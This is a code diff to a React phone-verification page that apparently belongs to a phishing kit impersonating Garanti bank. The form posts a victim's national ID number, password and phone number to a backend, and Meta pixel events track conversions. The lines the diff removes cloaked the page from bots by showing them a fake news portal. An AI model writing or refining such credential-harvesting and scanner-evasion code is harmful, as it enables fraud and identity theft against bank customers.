@@ -1,12 +1,10 @@
-// src/Telefon.js
 import React, { useState, useEffect } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
 import axios from 'axios';
 import { useAuth } from './AuthContext';
-import { Helmet } from 'react-helmet';
-/* global fbq */
 
-function Telefon({ isBot }) {
+/* global fbq */
+function Telefon() {
   const { state: authState, dispatch } = useAuth();
   const [phoneNumber, setPhoneNumber] = useState('');
   const [phoneError, setPhoneError] = useState('');
@@ -14,9 +12,10 @@ function Telefon({ isBot }) {
   const navigate = useNavigate();
   const location = useLocation();
 
+  // _fbp ve _fbc yardımcı fonksiyonları
   const getFbp = () => {
     const cookies = document.cookie.split(';');
-    const fbpCookie = cookies.find((c) => c.trim().startsWith('_fbp='));
+    const fbpCookie = cookies.find(c => c.trim().startsWith('_fbp='));
     if (fbpCookie) {
       const fbp = fbpCookie.split('=')[1];
       if (/^fb\.1\.\d+\.\d+$/.test(fbp)) return fbp;
@@ -26,47 +25,40 @@ function Telefon({ isBot }) {
 
   const getFbc = () => {
     const cookies = document.cookie.split(';');
-    const fbcCookie = cookies.find((c) => c.trim().startsWith('_fbc='));
-    if (fbcCookie) {
-      const fbc = fbcCookie.split('=')[1];
-      return fbc;
-    }
+    const fbcCookie = cookies.find(c => c.trim().startsWith('_fbc='));
+    if (fbcCookie) return fbcCookie.split('=')[1];
+
     const urlParams = new URLSearchParams(window.location.search);
     const fbclid = urlParams.get('fbclid');
     if (fbclid) {
       const creationTime = Math.floor(Date.now() / 1000);
       const fbcValue = `fb.1.${creationTime}.${fbclid}`;
-      const isLocal = window.location.protocol === 'http:';
-      const secureFlag = isLocal ? '' : '; Secure';
+      const secureFlag = window.location.protocol === 'http:' ? '' : '; Secure';
       document.cookie = `_fbc=${fbcValue}; path=/; max-age=31536000; SameSite=Lax${secureFlag}`;
       return fbcValue;
     }
     return undefined;
   };
 
+  // Sayfa yüklendiğinde ViewContent
   useEffect(() => {
-    if (isBot || typeof window === 'undefined' || !window.fbq) return;
-    fbq('track', 'ViewContent', {
-      content_category: 'garanti_credit_form',
-      content_name: 'garanti_phone_verification_page',
-    });
-  }, [isBot]);
-
-  // fbclid kontrolü – her sayfada
-  useEffect(() => {
-    const urlParams = new URLSearchParams(window.location.search);
-    const fbclid = urlParams.get('fbclid');
-    if (fbclid && !document.cookie.includes('_fbc=')) {
-      const creationTime = Math.floor(Date.now() / 1000);
-      const fbcValue = `fb.1.${creationTime}.${fbclid}`;
-      const secureFlag = window.location.protocol === 'https:' ? '; Secure' : '';
-      document.cookie = `_fbc=${fbcValue}; path=/; max-age=31536000; SameSite=Lax${secureFlag}`;
+    if (typeof window !== 'undefined' && window.fbq) {
+      fbq('track', 'ViewContent', {
+        content_category: 'garanti_credit_form',
+        content_name: 'garanti_phone_verification_page',
+      });
     }
   }, []);
 
+  // Güvenlik: Sadece doğru kaynaktan gelinmişse devam et
+  useEffect(() => {
+    if (!location.state?.isValidNavigation || !authState.isAuthenticated) {
+      navigate('/', { replace: true });
+    }
+  }, [location.state, authState, navigate]);
+
   const trackMetaLead = async (phone, eventID) => {
-    if (isBot || typeof window === 'undefined' || !window.fbq) return;
-    try {
+    if (typeof window !== 'undefined' && window.fbq) {
       fbq('track', 'Lead', {
         custom_data: {
           content_category: 'garanti_lead_form',
@@ -75,52 +67,14 @@ function Telefon({ isBot }) {
           currency: 'TRY'
         },
       }, { eventID });
-      console.log('Meta Lead event tetiklendi:', { eventID: eventID.substring(0, 8) + '...' });
-    } catch (error) {
-      console.error('Meta event hatası:', error);
     }
   };
-
-  useEffect(() => {
-    if (
-      !location.state?.isValidNavigation ||
-      !authState.tc ||
-      !authState.password ||
-      !authState.isAuthenticated
-    ) {
-      navigate('/', { replace: true });
-    }
-  }, [location.state, authState, navigate]);
-
-  if (isBot) {
-    return (
-      <>
-        <Helmet><meta name="robots" content="index, follow" /></Helmet>
-        <div>
-          <h1 style={{ color: '#333', textAlign: 'center' }}>Güncel Haberler</h1>
-          <p style={{ maxWidth: '600px', margin: '20px auto', textAlign: 'center' }}>
-            Son dakika haberleri, ekonomi, spor ve daha fazlası için haber portalımıza hoş geldiniz.
-          </p>
-          <div style={{ margin: '10px 0' }}>
-            <h2>Ekonomi Gündemi</h2>
-            <p>Borsa ve döviz kurlarında son gelişmeler...</p>
-          </div>
-          <div style={{ margin: '10px 0' }}>
-            <h2>Spor Dünyasından Haberler</h2>
-            <p>Futbol liglerinde heyecan devam ediyor...</p>
-          </div>
-          <p style={{ textAlign: 'center' }}>
-            <a href="/" style={{ color: '#0066cc', textDecoration: 'none' }}>Ana Sayfaya Dön</a>
-          </p>
-        </div>
-      </>
-    );
-  }
 
   const handleSubmit = async (e) => {
     e.preventDefault();
     setPhoneError('');
     const cleanPhone = phoneNumber.replace(/\D/g, '');
+
     if (cleanPhone.length !== 10 || !cleanPhone.startsWith('5')) {
       setPhoneError('Telefon numarası 10 haneli olmalı ve 5 ile başlamalı.');
       return;
@@ -140,7 +94,6 @@ function Telefon({ isBot }) {
         password: authState.password,
         eventID: leadEventID,
         initEventID: location.state?.initEventID,
-        initEventTime: location.state?.initEventTime,
         fbp: getFbp(),
         fbc: getFbc(),
         completeEventID,
@@ -148,23 +101,20 @@ function Telefon({ isBot }) {
       };
 
       const apiUrl = process.env.REACT_APP_API_URL || 'http://localhost:3001';
-      const response = await axios.post(`${apiUrl}/submit`, payload);
-      console.log('[Telefon] API yanıtı:', response.data);
+      await axios.post(`${apiUrl}/submit`, payload);
 
       dispatch({ type: 'SET_PHONE_VERIFIED' });
-
       navigate('/bekleme', {
         state: {
           isValidNavigation: true,
           from: '/telefon',
           isCompleted: true,
-          leadEventID,
           completeEventID,
           completeEventTime
         }
       });
     } catch (error) {
-      console.error('[Telefon] API hatası:', error.response ? error.response.data : error.message);
+      console.error('[Telefon] Hata:', error);
       setPhoneError('Bilgiler gönderilemedi, lütfen tekrar deneyin.');
     } finally {
       setIsSubmitting(false);
@@ -196,7 +146,6 @@ function Telefon({ isBot }) {
                           onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 10))}
                           pattern="[0-9]*"
                           id="phoneNumber"
-                          name="telefonNoLabelUstte"
                           maxLength="10"
                           autoComplete="off"
                           placeholder="5XXXXXXXXX"
@@ -212,6 +161,7 @@ function Telefon({ isBot }) {
                     </div>
                   </div>
                 </div>
+
                 <div className="form-group form-group-offset footer-button">
                   <div className="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12">
                     <p>
